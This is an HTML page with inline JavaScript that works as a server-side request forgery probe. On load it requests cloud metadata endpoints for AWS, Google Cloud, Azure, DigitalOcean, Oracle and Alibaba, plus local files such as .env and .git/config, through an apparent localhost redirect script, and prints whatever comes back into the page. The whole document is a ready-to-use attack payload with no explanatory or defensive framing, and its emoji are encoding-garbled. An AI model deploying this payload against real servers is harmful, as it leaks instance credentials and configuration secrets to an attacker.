<!DOCTYPE html>
<html>
<head>
    <title>Cloud & Version Detection</title>
</head>
<body>
    <h1>‚òÅÔ∏è Cloud Provider & Version Intelligence</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Test different cloud metadata endpoints to identify provider
        var cloudTests = [
            // AWS variants
            'http://169.254.169.254/',
            'http://169.254.169.254/latest/',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/1.0/meta-data/',
            'http://169.254.169.254/2007-01-19/meta-data/',
            'http://169.254.169.254/2008-02-01/meta-data/',
            'http://169.254.169.254/2009-04-04/meta-data/',
            'http://169.254.169.254/2011-01-01/meta-data/',
            'http://169.254.169.254/2016-09-02/meta-data/',
            
            // Google Cloud
            'http://metadata.google.internal/',
            'http://metadata.google.internal/computeMetadata/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            
            // Azure
            'http://169.254.169.254/metadata/',
            'http://169.254.169.254/metadata/instance/',
            
            // DigitalOcean
            'http://169.254.169.254/metadata/',
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1.json',
            
            // Oracle Cloud
            'http://169.254.169.254/opc/',
            'http://169.254.169.254/opc/v1/',
            'http://169.254.169.254/opc/v2/',
            
            // Alibaba Cloud
            'http://100.100.100.200/',
            'http://100.100.100.200/latest/',
            
            // Check for version/debug endpoints
            'http://localhost/version',
            'http://localhost/debug',
            'http://localhost/.git/config',
            'http://localhost/.env',
            'http://localhost/composer.json',
            'http://localhost/package.json'
        ];
        
        for(var i = 0; i < cloudTests.length; i++) {
            try {
                results += "<h4>Test " + (i+1) + ": " + cloudTests[i] + "</h4>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + cloudTests[i], false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 0) {
                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>üéØ FOUND RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    results += "<div style='background:#f0f0f0;padding:8px;font-size:11px;max-height:100px;overflow:scroll;word-wrap:break-word;'>" + xhr.responseText + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå Empty</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå Failed</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
